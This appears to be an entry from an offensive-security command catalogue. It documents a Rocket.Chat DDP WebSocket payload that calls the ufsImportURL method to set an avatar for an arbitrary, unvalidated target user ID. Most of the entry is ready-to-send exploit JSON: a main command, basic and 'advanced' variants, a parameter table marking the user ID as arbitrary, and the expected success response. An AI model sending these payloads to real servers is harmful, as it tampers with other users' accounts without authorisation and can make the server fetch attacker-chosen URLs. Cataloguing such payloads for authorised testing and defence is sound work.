---
id: cmd-ufsimporturl-001
name: invoke-ufsimporturl-ddp
type: command
executor: websocket
data: >-
  {"msg":"method","method":"ufsImportURL","params":["https://radicallyopensecurity.com/images/ros-logo.gif",{"name":
  "ros.jpg", "extension": "jpg", "type": "text/plain", "userId":
  "<TARGET_USER_ID>"},"Avatars"],"id":"15"}
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.475Z'
platforms:
  - Web
tags:
  - ddp
  - api-exploit
  - file-upload
verified: false
validated: true
submitted: true
---

# invoke-ufsimporturl-ddp

## Command

```json
{"msg":"method","method":"ufsImportURL","params":["https://radicallyopensecurity.com/images/ros-logo.gif",{"name": "ros.jpg", "extension": "jpg", "type": "text/plain", "userId": "<TARGET_USER_ID>"},"Avatars"],"id":"15"}
```

## Description

This DDP (Meteor protocol) command invokes the ufsImportURL method over WebSocket to import an image from a URL and set it as an avatar for the specified userId in Rocket.Chat, exploiting lack of validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| msg | DDP message type (always "method") | Yes |
| method | API method name ("ufsImportURL") | Yes |
| params[0] | URL of the image to import | Yes |
| params[1].name | File name for the upload | Yes |
| params[1].extension | File extension (e.g., "jpg") | Yes |
| params[1].type | MIME type (e.g., "text/plain") | Yes |
| params[1].userId | Target user ID (arbitrary, unvalidated) | Yes |
| params[2] | Storage store ("Avatars") | Yes |
| id | Request ID (unique string) | Yes |

## Examples

### Basic Usage

```json
{"msg":"method","method":"ufsImportURL","params":["https://example.com/image.jpg",{"name": "avatar.jpg", "extension": "jpg", "type": "image/jpeg", "userId": "targetUser123"},"Avatars"],"id":"1"}
```

### Advanced Usage

Use a different image URL and adjust MIME type for binary images:

```json
{"msg":"method","method":"ufsImportURL","params":["https://custom-url.com/logo.png",{"name": "logo.png", "extension": "png", "type": "image/png", "userId": "<TARGET_USER_ID>"},"Avatars"],"id":"42"}
```

## Expected Output

Successful execution returns a DDP result like {"msg":"result", "result": {"etag": "upload-id"}, "id": "15"}, indicating the file was imported and stored. Errors would show in the response if validation fails elsewhere.

## Related

- [[Related Procedure|procedures/Invoke-ufsImportURL-for-Other-User-Avatar]]
